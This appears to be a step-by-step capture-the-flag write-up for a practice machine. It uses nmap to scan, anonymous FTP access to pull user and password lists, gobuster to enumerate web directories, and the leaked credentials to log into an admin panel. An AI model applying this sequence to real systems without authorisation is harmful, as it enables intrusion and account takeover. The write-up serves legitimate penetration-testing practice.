1. **Scan all the ports using default scripts and determine service and version of open ports**
```bash
nmap -sV -sC [target ip]
```
--> port 21/tcp - open - ftp
	ftp-anon: Anonymous FTP login allowed
		allowed.userlist / allowed.userlist.passwd

--> port 80/tcp - open- http


2. **Move inside the machine, get the files "allowed.userlist" and "allowed.userlist.passwd" and exit**
```bash
ftp [target ip]
	Connected to [target ip]
	Name ([target ip]:kali): Anonymous
	Login successful.
ftp> ls
	allowed.userlist / allowed.userlist.passwd
ftp> get allowed.userlist
	Transfer completed
ftp> get allowed.userlist.passwd
	Transfer completed
ftp> exit
```


3. **Check out the php and html web directories with Gobuster**
```bash
gobuster dir -u http://[target ip]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php, html
	/assets --> http://[target ip]/assets/
	/css --> http://[target ip]/css/
	/js --> http://[target ip]/js/
	*/logout.php --> http://[target ip]/login.php/
	/config.php
	/fonts --> http://[target ip]/fonts/
	/dashboard --> http://[target ip]/dashboard/
```
--> Try the URLs on your browser and check that in **"http://[target ip]/login.php/"** , we can see a login page


4. **Try the usernames and passwords that we got from the ftp server**
```bash
aron - root
pwnmeow - Supersecretpassword1
egotisticalsw - @BaASD&9032123sADS
admin - rKXM59ESxesUFHAd
```
--> When you write admin and his password, you only have to Capture the Flag which is at the top of the admin panel. That's it!
